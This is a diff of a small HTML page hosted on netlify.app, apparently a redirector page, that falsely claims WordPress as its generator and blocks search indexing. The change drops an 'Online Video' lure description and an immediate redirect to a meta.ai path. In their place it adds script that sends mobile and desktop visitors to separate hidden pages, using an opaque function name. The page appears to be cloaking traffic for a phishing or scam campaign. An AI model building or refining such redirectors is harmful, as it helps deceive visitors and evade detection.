@@ -11,17 +11,15 @@
     <meta name="generator" content="WordPress 5.3.2">
     <meta name="theme-color" content="#563d7c">
 
-    <!-- Robots -->
+    <!-- Robots (MOVED to HEAD) -->
     <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
 
-    <!-- Canonical (ABSOLUTE URL – FIXED) -->
+    <!-- Canonical (ABSOLUTE) -->
     <link rel="canonical" href="https://poetic-selkie-80d626.netlify.app/alcashfbmeta.html">
 
-    <!-- Open Graph (NO ERROR) -->
-    <meta property="og:title" content="Online Video" />
-    <meta property="og:description" content="Live video streaming online." />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://poetic-selkie-80d626.netlify.app/alcashfbmeta.html" />
+    <!-- Open Graph (FIXED) -->
+    <meta property="og:url" content="https://poetic-selkie-80d626.netlify.app/alcashfbmeta.html">
+    <meta property="og:type" content="website">
 
 </head>
 
@@ -30,7 +28,7 @@
 <script type="text/javascript">
 (function () {
 
-    function randomString(len) {
+    function h(len) {
         var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         var out = "";
         for (var i = 0; i < len; i++) {
@@ -39,8 +37,13 @@
         return out;
     }
 
-    var target = "https://www.meta.ai/" + randomString(7);
-    window.location.href = target;
+    var ua = navigator.userAgent;
+
+    if (/iphone|ipod|ipad|android|blackberry|opera mini|iemobile|mobile|windows phone/i.test(ua)) {
+        window.location.href = "./mobile.html?" + h(7);
+    } else {
+        window.location.href = "./pc.html?" + h(7);
+    }
 
 })();
 </script>
